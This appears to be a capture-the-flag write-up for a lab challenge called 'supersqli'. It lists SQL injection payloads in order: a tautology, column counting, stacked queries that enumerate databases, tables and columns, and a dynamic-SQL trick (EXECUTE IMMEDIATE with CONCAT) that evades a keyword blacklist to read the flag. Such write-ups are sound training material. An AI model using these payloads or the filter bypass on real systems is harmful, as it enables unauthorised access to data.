# supersqli

![Screenshot from 2021-07-24 23-58-40](https://user-images.githubusercontent.com/87865134/126875746-25f4935e-8d35-49c1-ab55-bc7822b36108.png)

- **SQLi**
- **Searh: `1' or 1=1 #` **
  - > all records

- **How many fields?**
  - `1' order by 3#` => error 1054
  -  `1' order by 2#` => have reccord
    - > 2 fields

- **Check type of fields**
  - `1' union select null, null #`  
  ![Screenshot from 2021-07-25 00-03-31](https://user-images.githubusercontent.com/87865134/126875875-2a0a5a8f-bfa7-4706-b295-410ed87515b8.png)
    - > can't use statement: select, update, delete, drop, insert, where, and .

- **Use other statements of ***MariaDB*** to show data:**   
  - `show databases, show tables, show columns`

- **show all databases:** 
  ```
  a'; show databases#
  ```  
  ![Screenshot from 2021-07-25 00-07-28](https://user-images.githubusercontent.com/87865134/126875975-b1b3530f-1db1-460d-985d-e15487e75e9b.png)

- **show tables in current database:**
  ```
  a'; show tables#
  ```    
  ![Screenshot from 2021-07-25 00-08-54](https://user-images.githubusercontent.com/87865134/126876016-64ba9e33-ff40-4563-bd99-349fb5b2929e.png)

- **Show columns of table ***1919810931114514***:**
  ```
  a'; show columns from `1919810931114514` from supersqli#
  ```  
  ![Screenshot from 2021-07-25 00-10-46](https://user-images.githubusercontent.com/87865134/126876065-8d593ed4-286b-4c36-8eb9-5f0b075408f6.png)

- **Use dynamic SQL to get content of this table:**
  ```
  a' ;EXECUTE IMMEDIATE CONCAT('SELE', 'CT flag FROM `1919810931114514`')#
  ```  
  ![Screenshot from 2021-07-25 00-12-16](https://user-images.githubusercontent.com/87865134/126876109-48487e24-2c84-41c0-8f6d-d128c80146d9.png)

### - Description:
> **category**: SQL injection

### - Reference:
  - [MariaDB SHOW Statement](https://mariadb.com/kb/en/show/)
  - [EXECUTE IMMEDIATE](https://mariadb.com/kb/en/execute-immediate/)


